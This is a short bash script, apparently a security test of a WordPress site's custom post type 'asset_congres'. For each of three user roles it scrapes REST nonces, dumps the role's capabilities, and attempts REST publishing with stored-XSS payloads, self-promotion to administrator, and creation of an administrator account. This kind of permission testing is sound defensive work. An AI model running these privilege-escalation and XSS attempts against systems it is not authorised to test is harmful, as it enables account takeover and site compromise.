#!/usr/bin/env bash
# Per role: capability dump via REST users/me, then try REST publish + role change + unfiltered HTML.
. "$(dirname "$0")/lib.sh"
for r in contributeur equipe direction; do
  N=$(as $r "$B/wp-admin/post-new.php?post_type=asset_congres" | grep -oE 'wpApiSettings = \{[^}]*"nonce":"[a-f0-9]+' | grep -oE '[a-f0-9]{10}$')
  [ -z "$N" ] && N=$(as $r "$B/wp-admin/admin-ajax.php?action=rest-nonce")
  echo "== $r restnonce=${N:0:4}..."
  as $r -H "X-WP-Nonce: $N" "$B/wp-json/wp/v2/users/me?context=edit" | python3 -c "import json,sys;d=json.load(sys.stdin);print('id',d.get('id'),'roles',d.get('roles'));print(sorted(k for k,v in d.get('capabilities',{}).items() if v))"
  echo "-- REST publish:"; as $r -H "X-WP-Nonce: $N" -H "Content-Type: application/json" -d '{"title":"SEC probe '$r' — exemple","status":"publish","content":"<script>alert(1)</script><img src=x onerror=alert(2)>"}' "$B/wp-json/wp/v2/asset_congres" | head -c 300; echo
  echo "-- REST pending:"; as $r -H "X-WP-Nonce: $N" -H "Content-Type: application/json" -d '{"title":"SEC pending '$r' — exemple","status":"pending","content":"<script>alert(1)</script>ok"}' "$B/wp-json/wp/v2/asset_congres" | python3 -c "import json,sys;d=json.load(sys.stdin);print(d.get('id'),d.get('status'),d.get('code'),(d.get('content') or {}).get('raw'))"
  echo "-- REST self-promote:"; as $r -H "X-WP-Nonce: $N" -H "Content-Type: application/json" -d '{"roles":["administrator"]}' "$B/wp-json/wp/v2/users/me" | head -c 200; echo
  echo "-- REST create user:"; as $r -H "X-WP-Nonce: $N" -H "Content-Type: application/json" -d '{"username":"evil'$r'","email":"e'$r'@example.com","password":"x12345678!","roles":["administrator"]}' "$B/wp-json/wp/v2/users" | head -c 200; echo
done
